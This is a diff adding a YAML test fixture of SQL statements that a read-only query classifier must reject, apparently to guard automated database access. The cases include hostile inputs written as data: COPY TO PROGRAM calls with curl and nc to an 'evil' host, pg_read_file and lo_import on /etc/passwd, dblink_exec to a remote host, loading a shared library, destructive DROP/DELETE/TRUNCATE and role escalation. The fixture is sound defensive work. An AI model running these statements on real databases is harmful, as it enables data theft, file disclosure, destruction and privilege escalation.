@@ -1,0 +1,163 @@
+# Statements that must never be executed as a plain read.
+#
+# Every case must be rejected at the parse stage, or be classified as a
+# write / DDL / unknown so that the policy cannot auto-allow it.
+# Variants obfuscate with comments, case, quoting and schema qualification.
+cases:
+  # Multiple statements
+  - { name: multi-drop, sql: "SELECT 1; DROP TABLE x" }
+  - { name: multi-delete, sql: "SELECT 1; DELETE FROM users" }
+  - { name: multi-comment, sql: "SELECT 1 /* ; */ ; /* x */ DELETE FROM users" }
+  - { name: multi-trailing-comment, sql: "SELECT 1; -- trailing\nDELETE FROM users" }
+  - { name: multi-select, sql: "SELECT 1; SELECT 2" }
+  - { name: multi-commit, sql: "SELECT 1; COMMIT; DROP TABLE users" }
+  - { name: multi-semicolon-string, sql: "SELECT ';'; DELETE FROM users" }
+
+  # Transaction control
+  - { name: commit, sql: "COMMIT" }
+  - { name: commit-then, sql: "COMMIT; DELETE FROM users" }
+  - { name: begin, sql: "BEGIN" }
+  - { name: rollback, sql: "ROLLBACK" }
+  - { name: end, sql: "END" }
+  - { name: start-transaction, sql: "START TRANSACTION READ WRITE" }
+  - { name: savepoint, sql: "SAVEPOINT s1" }
+  - { name: commit-lower, sql: "commit" }
+  - { name: commit-comment, sql: "/* hi */ CoMmIt /* there */" }
+  - { name: set-transaction, sql: "SET TRANSACTION READ WRITE" }
+
+  # Writable CTEs
+  - { name: cte-delete, sql: "WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d" }
+  - { name: cte-update, sql: "WITH u AS (UPDATE users SET plan = 'x' RETURNING id) SELECT count(*) FROM u" }
+  - { name: cte-insert, sql: "WITH i AS (INSERT INTO orders (user_id) VALUES (1) RETURNING id) SELECT 1" }
+  - { name: cte-nested, sql: "WITH a AS (SELECT 1), b AS (WITH c AS (DELETE FROM users RETURNING id) SELECT * FROM c) SELECT * FROM b" }
+  - { name: cte-delete-case, sql: "with D as (dElEtE from USERS returning *) select * from d" }
+  - { name: cte-merge, sql: "WITH m AS (MERGE INTO users u USING orders o ON u.id = o.user_id WHEN MATCHED THEN DELETE RETURNING u.id) SELECT * FROM m" }
+
+  # SELECT INTO / locking
+  - { name: select-into, sql: "SELECT * INTO new_table FROM users" }
+  - { name: select-into-temp, sql: "SELECT id INTO TEMP t FROM users" }
+  - { name: select-into-case, sql: "select * into \"Evil\" from users" }
+  - { name: for-update, sql: "SELECT * FROM users FOR UPDATE" }
+  - { name: for-share, sql: "SELECT * FROM users FOR SHARE" }
+  - { name: for-no-key-update, sql: "SELECT * FROM users FOR NO KEY UPDATE SKIP LOCKED" }
+  - { name: for-update-subquery, sql: "SELECT * FROM (SELECT * FROM users FOR UPDATE) s" }
+  - { name: for-key-share-comment, sql: "SELECT * FROM users /* x */ FOR /* y */ KEY SHARE" }
+
+  # EXPLAIN
+  - { name: explain-analyze-delete, sql: "EXPLAIN ANALYZE DELETE FROM users" }
+  - { name: explain-analyze-paren, sql: "EXPLAIN (ANALYZE) DELETE FROM users" }
+  - { name: explain-analyze-true, sql: "EXPLAIN (ANALYZE true, FORMAT JSON) UPDATE users SET plan = 'x'" }
+  - { name: explain-analyze-lower, sql: "explain analyse delete from users" }
+  - { name: explain-plain, sql: "EXPLAIN SELECT * FROM users" }
+
+  # Session settings
+  - { name: set, sql: "SET statement_timeout = 0" }
+  - { name: set-local, sql: "SET LOCAL statement_timeout = 0" }
+  - { name: set-role, sql: "SET ROLE postgres" }
+  - { name: set-session-authorization, sql: "SET SESSION AUTHORIZATION postgres" }
+  - { name: reset, sql: "RESET ALL" }
+  - { name: reset-role, sql: "RESET ROLE" }
+  - { name: set-search-path, sql: "set search_path to evil, public" }
+  - { name: set-config, sql: "SELECT set_config('statement_timeout', '0', false)" }
+  - { name: set-config-qualified, sql: "SELECT pg_catalog.set_config('search_path', 'evil', false)" }
+  - { name: set-config-quoted, sql: "SELECT \"pg_catalog\".\"set_config\"('role', 'postgres', false)" }
+  - { name: set-config-upper, sql: "SELECT SET_CONFIG('x.y', '1', false)" }
+  - { name: set-config-in-where, sql: "SELECT id FROM users WHERE set_config('a.b', email, false) IS NOT NULL" }
+  - { name: alter-system, sql: "ALTER SYSTEM SET log_statement = 'none'" }
+
+  # DO blocks / procedures
+  - { name: do, sql: "DO $$ BEGIN DELETE FROM users; END $$" }
+  - { name: do-language, sql: "DO LANGUAGE plpgsql 'BEGIN PERFORM 1; END'" }
+  - { name: call, sql: "CALL my_proc()" }
+  - { name: call-qualified, sql: "CALL public.my_proc(1)" }
+
+  # COPY
+  - { name: copy-to-program, sql: "COPY users TO PROGRAM 'curl http://evil'" }
+  - { name: copy-from-program, sql: "COPY users FROM PROGRAM 'id'" }
+  - { name: copy-to-file, sql: "COPY users TO '/tmp/x'" }
+  - { name: copy-query-to-program, sql: "COPY (SELECT * FROM users) TO PROGRAM 'nc evil 1'" }
+  - { name: copy-to-stdout, sql: "COPY users TO STDOUT" }
+  - { name: copy-lower, sql: "copy users to program 'id'" }
+
+  # Server file access
+  - { name: pg-read-file, sql: "SELECT pg_read_file('/etc/passwd')" }
+  - { name: pg-read-file-qualified, sql: "SELECT pg_catalog.pg_read_file('/etc/passwd')" }
+  - { name: pg-read-file-quoted, sql: "SELECT \"pg_read_file\"('/etc/passwd')" }
+  - { name: pg-read-file-upper, sql: "SELECT PG_READ_FILE('/etc/passwd')" }
+  - { name: pg-read-file-comment, sql: "SELECT pg_read_file /* x */ ('/etc/passwd')" }
+  - { name: pg-read-binary-file, sql: "SELECT pg_read_binary_file('/etc/passwd')" }
+  - { name: pg-ls-dir, sql: "SELECT * FROM pg_ls_dir('.')" }
+  - { name: pg-stat-file, sql: "SELECT pg_stat_file('postgresql.conf')" }
+  - { name: lo-import, sql: "SELECT lo_import('/etc/passwd')" }
+  - { name: lo-export, sql: "SELECT lo_export(1, '/tmp/x')" }
+  - { name: lo-import-qualified, sql: "SELECT pg_catalog.lo_import('/etc/passwd')" }
+  - { name: lo-get, sql: "SELECT lo_get(1234)" }
+  - { name: file-in-subquery, sql: "SELECT id FROM users WHERE name = (SELECT pg_read_file('/etc/passwd'))" }
+  - { name: file-in-cte, sql: "WITH f AS (SELECT pg_read_file('/etc/passwd') AS c) SELECT c FROM f" }
+  - { name: file-in-from, sql: "SELECT * FROM pg_read_file('/etc/passwd') AS f" }
+  - { name: file-in-order, sql: "SELECT id FROM users ORDER BY pg_read_file('/etc/passwd')" }
+  - { name: file-in-lateral, sql: "SELECT * FROM users, LATERAL (SELECT pg_read_file('/etc/passwd')) x" }
+
+  # Remote connections / backend control
+  - { name: dblink, sql: "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(a int)" }
+  - { name: dblink-exec, sql: "SELECT dblink_exec('host=evil', 'DROP TABLE users')" }
+  - { name: dblink-qualified, sql: "SELECT public.dblink('host=evil', 'SELECT 1')" }
+  - { name: dblink-connect, sql: "SELECT dblink_connect('host=evil')" }
+  - { name: pg-terminate-backend, sql: "SELECT pg_terminate_backend(123)" }
+  - { name: pg-terminate-backend-all, sql: "SELECT pg_terminate_backend(pid) FROM pg_stat_activity" }
+  - { name: pg-cancel-backend, sql: "SELECT pg_catalog.pg_cancel_backend(1)" }
+  - { name: pg-reload-conf, sql: "SELECT pg_reload_conf()" }
+  - { name: pg-sleep, sql: "SELECT pg_sleep(1000)" }
+
+  # Functions that run SQL text or have side effects
+  - { name: query-to-xml, sql: "SELECT query_to_xml('DELETE FROM users RETURNING 1', true, false, '')" }
+  - { name: ts-stat, sql: "SELECT * FROM ts_stat('SELECT to_tsvector(email) FROM users')" }
+  - { name: nextval, sql: "SELECT nextval('users_id_seq')" }
+  - { name: setval, sql: "SELECT setval('users_id_seq', 1)" }
+  - { name: advisory-lock, sql: "SELECT pg_advisory_lock(1)" }
+  - { name: pg-notify, sql: "SELECT pg_notify('ch', 'x')" }
+  - { name: current-setting, sql: "SELECT current_setting('data_directory')" }
+  - { name: user-function, sql: "SELECT evil()" }
+  - { name: user-function-qualified, sql: "SELECT public.evil(1)" }
+  - { name: txid-current, sql: "SELECT txid_current()" }
+
+  # PREPARE / EXECUTE / cursors
+  - { name: prepare, sql: "PREPARE p AS DELETE FROM users" }
+  - { name: execute, sql: "EXECUTE p" }
+  - { name: deallocate, sql: "DEALLOCATE ALL" }
+  - { name: declare-cursor, sql: "DECLARE c CURSOR FOR SELECT * FROM users" }
+  - { name: fetch, sql: "FETCH ALL FROM c" }
+
+  # NOTIFY / LISTEN / LOCK
+  - { name: notify, sql: "NOTIFY ch, 'x'" }
+  - { name: listen, sql: "LISTEN ch" }
+  - { name: unlisten, sql: "UNLISTEN *" }
+  - { name: lock, sql: "LOCK TABLE users IN ACCESS EXCLUSIVE MODE" }
+  - { name: lock-lower, sql: "lock users" }
+
+  # Misc utility
+  - { name: discard, sql: "DISCARD ALL" }
+  - { name: load, sql: "LOAD 'evil.so'" }
+  - { name: checkpoint, sql: "CHECKPOINT" }
+  - { name: vacuum, sql: "VACUUM FULL users" }
+  - { name: show, sql: "SHOW ALL" }
+  - { name: parameters, sql: "SELECT * FROM users WHERE id = $1" }
+
+  # Writes and DDL (must never be classified as reads)
+  - { name: delete-no-where, sql: "DELETE FROM users" }
+  - { name: update-no-where, sql: "UPDATE users SET plan = 'free'" }
+  - { name: truncate, sql: "TRUNCATE users" }
+  - { name: truncate-qualified, sql: "TRUNCATE TABLE public.users CASCADE" }
+  - { name: insert-select, sql: "INSERT INTO orders SELECT * FROM orders" }
+  - { name: drop-table, sql: "DROP TABLE users" }
+  - { name: create-function, sql: "CREATE FUNCTION evil() RETURNS int AS 'SELECT 1' LANGUAGE sql" }
+  - { name: alter-role, sql: "ALTER ROLE app SUPERUSER" }
+  - { name: grant, sql: "GRANT ALL ON users TO public" }
+
+  # Unparseable
+  - { name: garbage, sql: "SELEC * FRM users" }
+  - { name: unterminated-string, sql: "SELECT 'abc" }
+  - { name: unterminated-comment, sql: "SELECT 1 /* never closed" }
+  - { name: only-comment, sql: "-- nothing here" }
+  - { name: empty, sql: "   " }
+  - { name: only-semicolons, sql: ";;;" }
